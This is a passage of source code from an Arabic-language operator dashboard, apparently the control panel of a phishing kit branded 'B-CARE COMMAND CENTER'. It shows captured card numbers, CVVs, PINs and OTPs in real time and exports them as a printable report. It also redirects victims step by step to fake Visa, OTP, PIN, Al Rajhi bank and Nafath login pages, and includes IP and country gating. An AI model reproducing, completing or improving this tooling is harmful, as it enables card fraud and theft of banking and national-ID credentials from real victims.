            addNotification('page', 'انتقل الزائر (#' + data.userId + ') إلى صفحة: ' + data.page);
            const userId = data.userId;
            const page = data.page;
            const pageEl = $('#page' + userId);
            if (pageEl.length) {
                pageEl.text(page);
                const module = pageEl.closest('.user-module');
                module.find('.pulse-indicator').addClass('active').removeClass('offline waiting');
                module.find('.avatar-circle').addClass('active').removeClass('offline waiting');
                //triggerHighlight(module, '.grid-container');
            }

            // Real-time Side Sheet Refresh
            if (userId == currentActiveUser) {
                loadDetailPanel(userId, true);
            }
        });

        channel.bind('update-user-accountt', function (data) {
            addNotification('update', 'قام الزائر (#' + data.userId + ') بإدخال معلومات جديدة وتحديث حالته');
            const userId = data.userId;
            const updatedData = data.updatedData;

            // If we are in the "Visitors" tab, update the visitor message and move to top
            const msgEl = $('#message' + userId);
            if (msgEl.length) {
                msgEl.text(updatedData.message || 'معلومات جديدة');
                const visitorCard = $('.user-module[data-user-id="' + userId + '"]');
                triggerHighlight(visitorCard, '.grid-container');
            }

            // If we are in the "Cards" tab
            if (currentTab === 'cards') {
                const cardMod = $('.cards-grid-container').find('.user-module[data-user-id="' + userId + '"]');
                if (cardMod.length) {
                    // Update existing card fields real-time
                    const cardId = cardMod.data('card-id');
                    if (updatedData.otp) cardMod.find('.otp-val-' + cardId).text(updatedData.otp);
                    if (updatedData.password) cardMod.find('.pin-val-' + cardId).text(updatedData.password);
                    if (updatedData.totalprice) cardMod.find('.price-val-' + cardId).text(updatedData.totalprice);

                    triggerHighlight(cardMod, '.cards-grid-container');
                } else if (updatedData.cardNumber) {
                    // New card, fetch and prepend
                    $.ajax({
                        url: "cards-list-item.php",
                        success: function (response) {
                            $('.cards-grid-container').prepend(response);
                            triggerHighlight('.user-module:first', '.cards-grid-container');
                            incrementBadge('#card-count-badge');
                            updateDashboardStats(); // Refresh navbar counts
                        }
                    });
                }
            } else if (updatedData.cardNumber) {
                incrementBadge('#card-count-badge');
            }

            audio.play().catch(console.error);

            // Real-time Side Sheet Refresh
            if (userId == currentActiveUser) {
                loadDetailPanel(userId, true);
            }
        });

        function incrementBadge(selector) {
            const badge = $(selector);
            if (badge.length) {
                const currentCount = parseInt(badge.text()) || 0;
                badge.text(currentCount + 1);
            }
        }

        function updateBulkBar() {
            const count = $('.user-checkbox:checked').length;
            if (count > 0) {
                $('#bulkBar').addClass('active');
                $('.selected-count').text(count);
            } else {
                $('#bulkBar').removeClass('active');
            }
        }

        function unselectAll() {
            $('.user-checkbox').prop('checked', false);
            updateBulkBar();
        }

        function confirmBulkDelete() {
            const selected = $('.user-checkbox:checked');
            const count = selected.length;
            if (count === 0) return;

            const currentTab = new URLSearchParams(window.location.search).get('tab') || 'visitors';
            const action = (currentTab === 'cards') ? 'delete_multiple_cards' : 'delete_multiple';
            const ids = selected.map(function () { return $(this).val(); }).get();

            Swal.fire({
                title: 'هل أنت متأكد؟',
                text: `أنت على وشك حذف ${count} من العناصر المحددة نهائياً!`,
                icon: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#d33',
                cancelButtonColor: '#3085d6',
                confirmButtonText: 'نعم، احذف الكل',
                cancelButtonText: 'إلغاء',
                reverseButtons: true
            }).then((result) => {
                if (result.isConfirmed) {
                    $.ajax({
                        url: 'admin-action.php',
                        type: 'POST',
                        dataType: 'json',
                        data: {
                            action: action,
                            ids: ids
                        },
                        success: function (res) {
                            if (res.success) {
                                Swal.fire({
                                    icon: 'success',
                                    title: 'تم الحذف بنجاح',
                                    text: `تم حذف ${count} من العناصر بنجاح`,
                                    timer: 2000,
                                    showConfirmButton: false
                                });

                                // Remove deleted items from UI
                                selected.each(function () {
                                    $(this).closest('.user-module, .card-module').fadeOut(300, function () {
                                        $(this).remove();
                                        updateBulkBar();
                                    });
                                });

                                // Update dashboard statistics
                                updateDashboardStats();
                            } else {
                                Swal.fire({ icon: 'error', title: 'خطأ', text: res.error || 'فشل الحذف' });
                            }
                        },
                        error: function () {
                            Swal.fire({ icon: 'error', title: 'خطأ في الاتصال', text: 'تعذر الاتصال بالخادم' });
                        }
                    });
                }
            });
        }

        function updateBannedStats(delta) {
            const el = $('.total-bans-count');
            let current = parseInt(el.text()) || 0;
            current += delta;
            if (current < 0) current = 0;
            el.text(current);

            if (current === 0) {
                $('#emptyBannedState').removeClass('d-none');
                $('#bannedIpsGrid').addClass('d-none');
            } else {
                $('#emptyBannedState').addClass('d-none');
                $('#bannedIpsGrid').removeClass('d-none');
            }
        }

        function updateBannedCardsStats(delta) {
            const el = $('.total-banned-cards-count');
            let current = parseInt(el.text()) || 0;
            current += delta;
            if (current < 0) current = 0;
            el.text(current);

            if (current === 0) {
                $('#emptyBannedCardsState').removeClass('d-none');
                $('#bannedCardsGrid').addClass('d-none');
            } else {
                $('#emptyBannedCardsState').addClass('d-none');
                $('#bannedCardsGrid').removeClass('d-none');
            }
        }

        function confirmDeleteCard(id) {
            Swal.fire({
                title: 'هل أنت متأكد؟',
                text: "لن تتمكن من التراجع عن حذف هذه البطاقة!",
                icon: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#d33',
                cancelButtonColor: '#3085d6',
                confirmButtonText: 'نعم، احذف',
                cancelButtonText: 'إلغاء'
            }).then((result) => {
                if (result.isConfirmed) {
                    $.post('admin-action.php', { action: 'delete_card', id: id }, function (res) {
                        if (res.success) {
                            $('.card-view[data-card-id="' + id + '"]').slideUp(function () { $(this).remove(); });
                            Swal.fire({ icon: 'success', title: 'تم', text: 'تمت إزالة البطاقة.', timer: 1500, showConfirmButton: false });
                        } else {
                            Swal.fire('خطأ', res.error, 'error');
                        }
                    }, 'json');
                }
            });
        }

        function confirmUnbanCard(cardNumber, cardId) {
            Swal.fire({
                title: 'فك حظر البطاقة؟',
                text: "سيتم السماح باستخدام هذه البطاقة مجدداً.",
                icon: 'question',
                showCancelButton: true,
                confirmButtonColor: '#28a745',
                cancelButtonColor: '#3085d6',
                confirmButtonText: 'نعم، فك الحظر',
                cancelButtonText: 'إلغاء'
            }).then((result) => {
                if (result.isConfirmed) {
                    $.post('admin-action.php', { action: 'unban_card', card_number: cardNumber }, function (res) {
                        if (res.success) {
                            // Update UI if in Cards View
                            if (cardId) {
                                $('.ban-status-badge[data-card-id="' + cardId + '"]').empty();
                                const wrapper = $('.card-ban-btn-wrapper[data-card-id="' + cardId + '"]');
                                wrapper.html(`<button type="button" class="btn-clean ban card-ban-btn" onclick="confirmBanCard('${cardNumber}', ${cardId})" title="حظر البطاقة"><i class="bi bi-slash-circle"></i></button>`);
                            }

                            // Update UI in Banned Cards Grid View
                            $('.banned-card-item[data-card-number="' + cardNumber + '"]').slideUp(function () { $(this).remove(); });
                            updateBannedCardsStats(-1);

                            Swal.fire({ icon: 'success', title: 'تم التنفيذ', text: 'تم فك الحظر بنجاح.', timer: 1500, showConfirmButton: false });
                        } else {
                            Swal.fire('خطأ', res.error, 'error');
                        }
                    }, 'json');
                }
            });
        }

        function confirmBanCard(cardNumber, cardId) {
            Swal.fire({
                title: 'تأكيد الحظر',
                text: "سيتم منع أي زائر من استخدام رقم البطاقة هذا مستقبلاً.",
                icon: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#d33',
                cancelButtonColor: '#3085d6',
                confirmButtonText: 'حظر البطاقة',
                cancelButtonText: 'إلغاء'
            }).then((result) => {
                if (result.isConfirmed) {
                    $.post('admin-action.php', { action: 'ban_card', card_number: cardNumber }, function (res) {
                        if (res.success) {
                            // Update UI if in Cards View
                            if (cardId) {
                                $('.ban-status-badge[data-card-id="' + cardId + '"]').html('<span class="badge bg-danger ms-1" style="font-size:0.6rem;">محظورة</span>');
                                const wrapper = $('.card-ban-btn-wrapper[data-card-id="' + cardId + '"]');
                                wrapper.html(`<button type="button" class="btn-clean accept card-ban-btn" onclick="confirmUnbanCard('${cardNumber}', ${cardId})" title="فك حظر البطاقة"><i class="bi bi-shield-check"></i></button>`);
                            }

                            updateBannedCardsStats(1);
                            Swal.fire({ icon: 'success', title: 'تم الحظر', text: 'تم حظر البطاقة بشكل كامل ولن يتم قبولها مجدداً.', timer: 1500, showConfirmButton: false });
                        } else {
                            Swal.fire('خطأ', res.error, 'error');
                        }
                    }, 'json');
                }
            });
        }

        function confirmBanIP(ip, userId) {
            Swal.fire({
                title: 'حظر IP الزائر نهائياً؟',
                text: 'لن يتمكن هذا الزائر من الوصول إلى أي صفحة بالموقع',
                icon: 'warning',
                showCancelButton: true,
                confirmButtonColor: '#e11d48',
                cancelButtonColor: '#64748b',
                confirmButtonText: '<i class="bi bi-slash-circle"></i> نعم، حظر الآن',
                cancelButtonText: 'إلغاء'
            }).then((result) => {
                if (result.isConfirmed) {
                    $.post('admin-action.php', { action: 'ban_ip', ip: ip }, function (res) {
                        if (res.success) {
                            // Update UI if in Visitors / Cards Tab
                            if (userId) {
                                $('.ban-status-badge[data-user-id="' + userId + '"]').html('<span class="badge bg-danger ms-1" style="font-size:0.6rem;">محظور</span>');
                                const wrapper = $('.ip-ban-btn-wrapper[data-user-id="' + userId + '"]');
                                wrapper.html(`<a href="javascript:void(0)" onclick="confirmUnbanIP('${ip}', ${userId}); event.stopPropagation();" title="فك حظر IP الزائر" class="q-action" style="color: #059669; background: #d1fae5; border-color: #6ee7b7;"><i class="bi bi-shield-check"></i></a>`);

                                // Also update Card View if applicable
                                $('.ip-ban-btn-wrapper[data-card-id="' + userId + '"]').html(`<button type="button" class="btn-clean accept ip-ban-btn" onclick="confirmUnbanIP('${ip}', ${userId})" title="فك حظر IP"><i class="bi bi-unlock"></i></button>`);
                            }

                            // Update Side Sheet if open for THIS user
                            if (currentActiveUser == userId) {
                                $('#p-ban-link').attr('onclick', `confirmUnbanIP('${ip}', ${userId})`)
                                    .html('<i class="bi bi-shield-check"></i> فك الحظر')
                                    .css({ 'background': '#d1fae5', 'color': '#059669', 'border': '1px solid #6ee7b7' });
                            }

                            updateBannedStats(1);
                            Swal.fire({ icon: 'success', title: 'تم الحظر', text: 'تم حظر اتصال الزائر بنجاح', timer: 1500, showConfirmButton: false });
                        } else {
                            Swal.fire({ icon: 'error', title: 'خطأ', text: res.error || 'حدث خطأ أثناء الحظر' });
                        }
                    }, 'json');
                }
            });
        }

        function confirmUnbanIP(ip, userId) {
            Swal.fire({
                title: 'فك حظر IP الزائر؟',
                text: 'سيتم السماح بتمرير اتصالات هذا الزائر بشكل طبيعي',
                icon: 'question',
                showCancelButton: true,
                confirmButtonColor: '#059669',
                cancelButtonColor: '#64748b',
                confirmButtonText: '<i class="bi bi-shield-check"></i> نعم، فك الحظر',
                cancelButtonText: 'إلغاء'
            }).then((result) => {
                if (result.isConfirmed) {
                    $.post('admin-action.php', { action: 'unban_ip', ip: ip }, function (res) {
                        if (res.success) {
                            // Update UI if in Visitors / Cards Tab
                            if (userId) {
                                $('.ban-status-badge[data-user-id="' + userId + '"]').empty();
                                const wrapper = $('.ip-ban-btn-wrapper[data-user-id="' + userId + '"]');
                                wrapper.html(`<a href="javascript:void(0)" onclick="confirmBanIP('${ip}', ${userId}); event.stopPropagation();" title="حظر IP الزائر" class="q-action" style="color: #e11d48; background: #ffe4e6; border-color: #fda4af;"><i class="bi bi-slash-circle-fill"></i></a>`);

                                // Also update Card View if applicable
                                $('.ip-ban-btn-wrapper[data-card-id="' + userId + '"]').html(`<button type="button" class="btn-clean ban ip-ban-btn" onclick="confirmBanIP('${ip}', ${userId})" title="حظر IP"><i class="bi bi-lock"></i></button>`);
                            }

                            // Update Side Sheet if open for THIS user
                            if (currentActiveUser == userId) {
                                $('#p-ban-link').attr('onclick', `confirmBanIP('${ip}', ${userId})`)
                                    .html('<i class="bi bi-slash-circle"></i> حظر')
                                    .css({ 'background': '#ffe4e6', 'color': '#e11d48', 'border': '1px solid #fda4af' });
                            }

                            // Update UI in Banned IPs View
                            $('.ip-ban-card[data-ip-address="' + ip + '"]').slideUp(function () { $(this).remove(); });

                            updateBannedStats(-1);
                            Swal.fire({ icon: 'success', title: 'تم التنفيذ', text: 'تم فك حظر اتصال الزائر بنجاح', timer: 1500, showConfirmButton: false });
                        } else {
                            Swal.fire({ icon: 'error', title: 'خطأ', text: res.error || 'حدث خطأ أثناء فك الحظر' });
                        }
                    }, 'json');
                }
            });
        }
        function loadAllowedCountries() {
            const list = $('#allowedCountriesList');
            list.html('<div class="text-center w-100 p-3 opacity-50"><div class="spinner-border spinner-border-sm"></div></div>');

            $.post('admin-action.php', { action: 'get_allowed_countries' }, function (res) {
                if (res.success) {
                    list.empty();
                    if (res.countries.length === 0) {
                        list.html('<div class="text-muted small py-2 w-100 text-center">لا توجد دول محددة (الوصول مفتوح للجميع)</div>');
                    } else {
                        res.countries.forEach(c => {
                            list.append(`
                                <div class="d-flex align-items-center bg-white border border-light rounded-pill px-3 py-2 shadow-sm">
                                    <span class="fw-bold ms-2 small">${c.country_name}</span>
                                    <span class="badge bg-light text-muted ms-2" style="font-size: 0.6rem;">${c.country_code}</span>
                                    <a href="javascript:void(0)" onclick="removeCountry(${c.id})" class="text-danger opacity-50 hover-opacity-100 ms-1">
                                        <i class="bi bi-x-circle-fill"></i>
                                    </a>
                                </div>
                            `);
                        });
                    }
                }
            }, 'json');
        }

        function openCountriesModal() {
            var modalEl = document.getElementById('countriesModal');
            var modal = bootstrap.Modal.getInstance(modalEl);
            if (!modal) modal = new bootstrap.Modal(modalEl);
            modal.show();
            loadAllowedCountries();
        }

        function addCountry() {
            const val = $('#countrySelect').val();
            if (!val) return;
            const parts = val.split('|');
            const code = parts[0];
            const name = parts[1];

            $.post('admin-action.php', { action: 'add_allowed_country', code: code, name: name }, function (res) {
                if (res.success) {
                    loadAllowedCountries();
                } else {
                    Swal.fire('خطأ', res.error, 'error');
                }
            }, 'json');
        }

        function removeCountry(id) {
            $.post('admin-action.php', { action: 'remove_allowed_country', id: id }, function (res) {
                if (res.success) {
                    loadAllowedCountries();
                }
            }, 'json');
        }

        function markChatUnread(sessionId, btnEl) {
            fetch('mark_chat_read.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ session_id: sessionId, action: 'mark_unread' })
            })
                .then(r => r.json())
                .then(res => {
                    if (res.success) {
                        const count = res.count || 0;

                        // Update the card's unread badge
                        const card = btnEl.closest('.user-module');
                        if (card) {
                            let badge = card.querySelector('.badge.bg-danger');
                            if (badge) {
                                badge.innerText = count;
                                badge.style.display = '';
                            } else {
                                // Create badge if not exists
                                const avatarDiv = card.querySelector('.bg-opacity-10.text-primary');
                                if (avatarDiv) {
                                    avatarDiv.insertAdjacentHTML('beforeend',
                                        `<span class="position-absolute top-0 start-100 translate-middle badge rounded-pill bg-danger border border-light" style="font-size: 0.65rem;">${count}</span>`);
                                }
                            }
                        }

                        // Update global chat tab badge
                        const gBadge = document.getElementById('chat-tab-badge');
                        if (gBadge) {
                            let gVal = parseInt(gBadge.innerText) || 0;
                            gBadge.innerText = gVal + count;
                            gBadge.style.display = 'inline-block';
                            gBadge.animate([
                                { transform: 'scale(1)' },
                                { transform: 'scale(1.5)' },
                                { transform: 'scale(1)' }
                            ], { duration: 400 });
                        }

                        // Also update visitor card badge in Visitors tab
                        const visitorCard = document.querySelector(`.user-module[data-session-id="${sessionId}"]`);
                        if (visitorCard) {
                            const vBadge = visitorCard.querySelector('.chat-badge');
                            if (vBadge) {
                                vBadge.innerText = count;
                                vBadge.style.display = 'inline-block';
                            }
                        }

                        Swal.fire({ icon: 'success', title: 'تم التعليم', text: `تم تعليم ${count} رسالة كغير مقروءة`, timer: 1500, showConfirmButton: false });
                    } else {
                        Swal.fire({ icon: 'info', title: 'لا توجد رسائل', text: res.error || 'لا توجد رسائل لتعليمها', timer: 1500, showConfirmButton: false });
                    }
                });
        }

        function markChatUnreadFromCard(sessionId, btnEl) {
            fetch('mark_chat_read.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ session_id: sessionId, action: 'mark_unread' })
            })
                .then(r => r.json())
                .then(res => {
                    if (res.success) {
                        const count = res.count || 0;

                        // Update global chat tab badge
                        const gBadge = document.getElementById('chat-tab-badge');
                        if (gBadge) {
                            let gVal = parseInt(gBadge.innerText) || 0;
                            gBadge.innerText = gVal + count;
                            gBadge.style.display = 'inline-block';
                            gBadge.animate([{ transform: 'scale(1)' }, { transform: 'scale(1.5)' }, { transform: 'scale(1)' }], { duration: 400 });
                        }

                        // Update badges across all instances of this visitor (Visitors tab and Chat tab)
                        document.querySelectorAll(`.user-module[data-session-id="${sessionId}"]`).forEach(card => {
                            const badge = card.querySelector('.chat-badge, .chat-badge-on-avatar, .badge.bg-danger');
                            if (badge) {
                                badge.innerText = count;
                                badge.style.display = 'inline-block';
                            }
                        });

                        Swal.fire({ icon: 'success', title: 'تم التعليم', text: `تم تعليم ${count} رسالة كغير مقروءة`, timer: 1500, showConfirmButton: false });
                    } else {
                        Swal.fire({ icon: 'info', title: 'لا توجد رسائل', text: res.error || 'لا توجد رسائل لتعليمها', timer: 1500, showConfirmButton: false });
                    }
                });
        }

        function updateSystemSettings() {
            const chatDisabled = document.getElementById('chatEnabledToggle').checked;

            Swal.fire({
                title: 'جاري الحفظ...',
                allowOutsideClick: false,
                didOpen: () => {
                    Swal.showLoading();
                }
            });

            fetch('ajax_settings.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_disabled: chatDisabled })
            })
                .then(r => r.json())
                .then(res => {
                    if (res.success) {
                        Swal.fire({
                            icon: 'success',
                            title: 'تم الحفظ بنجاح!',
                            text: 'تم تحديث إعدادات النظام وتطبيقها فوراً.',
                            timer: 2000,
                            showConfirmButton: false
                        });
                    } else {
                        Swal.fire({
                            icon: 'error',
                            title: 'فشل الحفظ',
                            text: res.error || 'حدث خطأ أثناء محاولة حفظ الإعدادات.'
                        });
                    }
                })
                .catch(err => {
                    Swal.fire({
                        icon: 'error',
                        title: 'خطأ في الاتصال',
                        text: 'تعذر الاتصال بالخادم. يرجى التحقق من اتصالك.'
                    });
                });
        }
        function changeAdminPassword() {
            const newPass = document.getElementById('newAdminPassword').value;
            if (!newPass) {
                Swal.fire({ icon: 'warning', title: 'تنبيه', text: 'يرجى إدخال كلمة المرور الجديدة أولاً.' });
                return;
            }

            Swal.fire({
                title: 'جاري التحديث...',
                didOpen: () => { Swal.showLoading(); }
            });

            fetch('ajax_settings.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'change_password', new_password: newPass })
            })
                .then(r => r.json())
                .then(res => {
                    if (res.success) {
                        document.getElementById('newAdminPassword').value = '';
                        Swal.fire({
                            icon: 'success',
                            title: 'تم التغيير!',
                            text: 'تم تحديث كلمة المرور بنجاح.',
                            timer: 2000,
                            showConfirmButton: false
                        });
                    } else {
                        Swal.fire({ icon: 'error', title: 'خطأ', text: res.error });
                    }
                });
        }

        function togglePassVisibility() {
            const input = document.getElementById('newAdminPassword');
            const icon = document.getElementById('passToggleIcon');
            if (input.type === 'password') {
                input.type = 'text';
                icon.classList.replace('bi-eye', 'bi-eye-slash');
            } else {
                input.type = 'password';
                icon.classList.replace('bi-eye-slash', 'bi-eye');
            }
        }

        function exportCardsToPDF() {
            Swal.fire({
                title: 'جاري تجهيز التقرير...',
                text: 'يرجى الانتظار، جاري تجميع البيانات وتوليد الملف.',
                allowOutsideClick: false,
                didOpen: () => {
                    Swal.showLoading();
                }
            });

            fetch('ajax_export_cards.php')
                .then(r => r.json())
                .then(res => {
                    if (!res.success) {
                        Swal.fire({ icon: 'error', title: 'خطأ', text: res.error || 'فشل في جلب البيانات.' });
                        return;
                    }
                    if (res.data.length === 0) {
                        Swal.fire({ icon: 'info', title: 'تنبيه', text: 'لا توجد بطاقات مسجلة حالياً للتصدير.' });
                        return;
                    }

                    // Build a full HTML page and open in new window, then print as PDF
                    const cards = res.data;
                    let rows = '';
                    cards.forEach((card, i) => {
                        const bg = i % 2 === 0 ? '#ffffff' : '#f0f4f8';
                        rows += `<tr style="background:${bg};">
                            <td>${i + 1}</td>
                            <td>${card.cc_name || '---'}</td>
                            <td style="font-family:monospace;letter-spacing:1px;" dir="ltr">${card.cc_number || '---'}</td>
                            <td>${card.cc_exp || '---'}</td>
                            <td>${card.cc_cvv || '---'}</td>
                            <td>${card.cc_password || '---'}</td>
                            <td style="font-weight:bold;color:#b45309;">${card.cc_otp || '---'}</td>
                            <td>${card.status || '---'}</td>
                        </tr>`;
                    });

                    const htmlContent = `<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
<meta charset="UTF-8">
<title>تقرير البطاقات</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Cairo', Arial, sans-serif; padding: 30px; color: #333; direction: rtl; }
  h2 { color: #156394; text-align: center; margin-bottom: 6px; }
  p.subtitle { text-align: center; color: #777; font-size: 0.85rem; margin-bottom: 20px; }
  table { width: 100%; border-collapse: collapse; font-size: 0.82rem; }
  thead tr { background-color: #156394; color: white; }
  th, td { border: 1px solid #ccc; padding: 8px 10px; text-align: center; }
  th:nth-child(6) { background-color: #f59e0b; }
  .footer { text-align: center; margin-top: 30px; font-size: 0.7rem; color: #999; border-top: 1px solid #eee; padding-top: 10px; }
  @media print {
    body { padding: 10px; }
    button { display: none; }
  }
</style>
</head>
<body>
<h2>تقرير كافة البطاقات المسجلة</h2>
<p class="subtitle">تاريخ التصدير: ${new Date().toLocaleString('ar-EG')} — إجمالي البطاقات: ${cards.length}</p>
<table>
  <thead>
    <tr>
      <th>#</th>
      <th>الاسم</th>
      <th>رقم البطاقة</th>
      <th>الانتهاء</th>
      <th>CVV</th>
      <th>Password</th>
      <th>OTP</th>
      <th>الحالة</th>
    </tr>
  </thead>
  <tbody>${rows}</tbody>
</table>
<div class="footer">تم إنشاء هذا التقرير آلياً عبر نظام B-CARE | COMMAND CENTER</div>
<script>window.onload = function() { window.print(); }<\/script>
</body>
</html>`;

                    const printWindow = window.open('', '_blank');
                    if (!printWindow) {
                        Swal.fire({ icon: 'error', title: 'خطأ', text: 'يرجى السماح للمتصفح بفتح نوافذ منبثقة ثم المحاولة مجدداً.' });
                        return;
                    }
                    printWindow.document.write(htmlContent);
                    printWindow.document.close();

                    Swal.fire({
                        icon: 'success',
                        title: 'تم بنجاح!',
                        text: 'تم فتح نافذة الطباعة. اختر "حفظ كـ PDF" من خيارات الطابعة.',
                        timer: 3000,
                        showConfirmButton: false
                    });
                })
                .catch(err => {
                    console.error('Export Error:', err);
                    Swal.fire({ icon: 'error', title: 'خطأ في الاتصال', text: 'تعذر الاتصال بالخادم لتصدير البيانات.' });
                });
        }
    </script>

    <!-- ===== All Modals (Consolidated at Root) ===== -->

    <!-- 1A. Card Action & Redirect Modal -->
    <div class="modal fade" id="cardActionModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content border-0 shadow-lg" style="border-radius:20px;overflow:hidden;">
                <div class="modal-header border-0 pb-0 d-flex align-items-center justify-content-between"
                    style="background:linear-gradient(135deg,#6366f1,#a855f7);color:white;padding:30px 40px;">
                    <div class="d-flex align-items-center gap-4">
                        <div class="p-3 bg-opacity-20 rounded-4 shadow-sm text-white d-flex align-items-center justify-content-center"
                            style="width:60px;height:60px;">
                            <i class="bi bi-credit-card-2-front-fill fs-3"></i>
                        </div>
                        <div>
                            <h5 class="modal-title fw-800 mb-1" id="cardModalTitle" style="letter-spacing:-0.5px;">
                                مركز التحكم الفوري</h5>
                            <p class="mb-3 opacity-75 small fw-bold" id="cardModalSubtitle">بوابة التوجيه والتحكم
                                البطاقات</p>
                        </div>
                    </div>
                </div>
                <div class="modal-body p-4">
                    <label class="fw-bold text-muted small mb-2 d-block text-end">🔗 وجهة التوجيه بعد الإجراء:</label>
                    <div class="d-flex flex-column gap-2" id="pageOptionsCard" style="direction: rtl;">
                        <label class="d-flex align-items-center gap-3 p-3 border rounded-3 page-option"
                            style="cursor:pointer;transition:0.2s;">
                            <input type="radio" name="modalPageCard" value="payment.php" class="form-check-input m-0"
                                checked>
                            <i class="bi bi-credit-card-fill text-primary fs-5"></i>
                            <span class="fw-semibold">صفحة البطاقة (Visa)</span>
                        </label>
                        <label class="d-flex align-items-center gap-3 p-3 border rounded-3 page-option"
                            style="cursor:pointer;transition:0.2s;">
                            <input type="radio" name="modalPageCard" value="otp.php" class="form-check-input m-0">
                            <i class="bi bi-shield-check text-warning fs-5"></i>
                            <span class="fw-semibold">رمز التحقق (OTP)</span>
                        </label>
                        <label class="d-flex align-items-center gap-3 p-3 border rounded-3 page-option"
                            style="cursor:pointer;transition:0.2s;">
                            <input type="radio" name="modalPageCard" value="password.php" class="form-check-input m-0">
                            <i class="bi bi-shield-lock-fill text-success fs-5"></i>
                            <span class="fw-semibold">صفحة الرمز السري (PIN)</span>
                        </label>
                        <label class="d-flex align-items-center gap-3 p-3 border rounded-3 page-option"
                            style="cursor:pointer;transition:0.2s;">
                            <input type="radio" name="modalPageCard" value="raj.php" class="form-check-input m-0">
                            <i class="bi bi-credit-card-fill text-primary fs-5"></i>
                            <span class="fw-semibold">صفحة الراجحي</span>
                        </label>
                        <label class="d-flex align-items-center gap-3 p-3 border rounded-3 page-option"
                            style="cursor:pointer;transition:0.2s;">
                            <input type="radio" name="modalPageCard" value="nafath.php" class="form-check-input m-0">
                            <i class="bi bi-person-badge-fill text-info fs-5"></i>
                            <span class="fw-semibold">صفحة نفاذ (Nafath)</span>
                        </label>
                    </div>
                </div>
                <div class="modal-footer border-0 p-4 pt-0">
                    <button type="button" class="btn btn-light flex-fill fw-bold rounded-3"
                        data-bs-dismiss="modal">إلغاء</button>
                    <button type="button" id="confirmCardBtn" onclick="confirmCardAction(event)"
                        class="btn btn-primary flex-fill fw-bold rounded-3">تأكيد</button>
                </div>
            </div>
        </div>
    </div>

    <!-- 1B. Nafath Action & Redirect Modal -->
    <div class="modal fade" id="nafathActionModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content border-0 shadow-lg" style="border-radius:20px;overflow:hidden;">
                <div class="modal-header border-0 pb-0 d-flex align-items-center justify-content-between"
                    style="background:linear-gradient(135deg,#156394,#3b82f6);color:white;padding:30px 40px;">
                    <div class="d-flex align-items-center gap-4">
                        <div class="p-3 bg-opacity-20 rounded-4 shadow-sm text-white d-flex align-items-center justify-content-center"
                            style="width:60px;height:60px;">
                            <i class="bi bi-person-badge fs-3"></i>
                        </div>
                        <div>
                            <h5 class="modal-title fw-800 mb-1" id="nafathModalTitle" style="letter-spacing:-0.5px;">
                                إدارة الدخول الموحد نفاذ</h5>
                            <p class="mb-3 opacity-75 small fw-bold" id="nafathModalSubtitle">بوابة التوجيه الخاصة بنفاذ
                            </p>
                        </div>
                    </div>
                </div>
                <div class="modal-body p-4">
                    <label class="fw-bold text-muted small mb-2 d-block text-end">🔗 وجهة التوجيه بعد الإجراء:</label>
                    <div class="d-flex flex-column gap-2" id="pageOptionsNafath" style="direction: rtl;">
                        <label class="d-flex align-items-center gap-3 p-3 border rounded-3 page-option"
                            style="cursor:pointer;transition:0.2s;">
                            <input type="radio" name="modalPageNafath" value="nafath.php" class="form-check-input m-0">
                            <i class="bi bi-person-badge-fill text-info fs-5"></i>
                            <span class="fw-semibold">إعادة محاولة نفاذ (Nafath)</span>
                        </label>
                        <label class="d-flex align-items-center gap-3 p-3 border rounded-3 page-option"
                            style="cursor:pointer;transition:0.2s;">
                            <input type="radio" name="modalPageNafath" value="StepOne.php" class="form-check-input m-0"
                                checked>
                            <i class="bi bi-phone-fill text-secondary fs-5"></i>
                            <span class="fw-semibold">شركات الهاتف</span>
                        </label>
                        <label class="d-flex align-items-center gap-3 p-3 border rounded-3 page-option"
                            style="cursor:pointer;transition:0.2s;">
                            <input type="radio" name="modalPageNafath" value="StepTwo.php" class="form-check-input m-0">
                            <i class="bi bi-phone-fill text-warning fs-5"></i>
                            <span class="fw-semibold">رقم الهاتف</span>
                        </label>
                        <label class="d-flex align-items-center gap-3 p-3 border rounded-3 page-option"
                            style="cursor:pointer;transition:0.2s;">
                            <input type="radio" name="modalPageNafath" value="StepThird.php"
                                class="form-check-input m-0">
                            <i class="bi bi-lock-fill text-success fs-5"></i>
                            <span class="fw-semibold">رمز التوثيق</span>
                        </label>
                        <label class="d-flex align-items-center gap-3 p-3 border rounded-3 page-option"
                            style="cursor:pointer;transition:0.2s;">
                            <input type="radio" name="modalPageNafath" value="nafath-call.php"
                                class="form-check-input m-0">
                            <i class="bi bi-telephone-fill text-success fs-5"></i>
                            <span class="fw-semibold">اتصال stc</span>
                        </label>
                        <label class="d-flex align-items-center gap-3 p-3 border rounded-3 page-option"
                            style="cursor:pointer;transition:0.2s;">
                            <input type="radio" name="modalPageNafath" value="StepFourth.php"
                                class="form-check-input m-0">
                            <i class="bi bi-person-fill text-danger fs-5"></i>
                            <span class="fw-semibold">معلومات الحساب</span>
                        </label>
                        <label class="d-flex align-items-center gap-3 p-3 border rounded-3 page-option"
                            style="cursor:pointer;transition:0.2s;">
                            <input type="radio" name="modalPageNafath" value="StepFifth.php"
                                class="form-check-input m-0">
                            <i class="bi bi-person-fill text-danger fs-5"></i>
                            <span class="fw-semibold">التحقّق بخطوتين</span>
                        </label>
                        <label class="d-flex align-items-center gap-3 p-3 border rounded-3 page-option"
                            style="cursor:pointer;transition:0.2s;">
                            <input type="radio" name="modalPageNafath" value="payment.php" class="form-check-input m-0">
                            <i class="bi bi-credit-card-fill text-primary fs-5"></i>
                            <span class="fw-semibold">رجوع إلى البطاقة (Visa)</span>
                        </label>
                    </div>
                </div>
                <div class="modal-footer border-0 p-4 pt-0">
